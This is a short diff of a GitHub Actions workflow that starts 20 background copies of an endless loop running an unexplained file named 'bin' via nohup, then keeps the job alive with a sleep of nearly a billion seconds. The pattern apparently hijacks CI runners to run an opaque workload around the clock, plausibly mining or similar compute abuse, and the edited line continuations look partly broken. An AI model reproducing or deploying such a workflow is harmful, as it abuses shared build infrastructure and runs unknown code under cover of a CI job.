@@ -22,13 +22,12 @@ jobs:
           # cp bin thread1 && cd thread1 && nohup bash run.sh & echo 'yes' && cd
 
           for i in $(seq 1 20); do
-            cd
+            cd \
             mkdir -p thread$i && \
             echo 'while true; do python3 bin; done' > thread$i/run.sh && \
             chmod +x thread$i/run.sh && \
             cp bin thread$i && \
             (cd thread$i && nohup bash run.sh & echo 'yes') \
-            cd
           done
 
           sleep 999999999
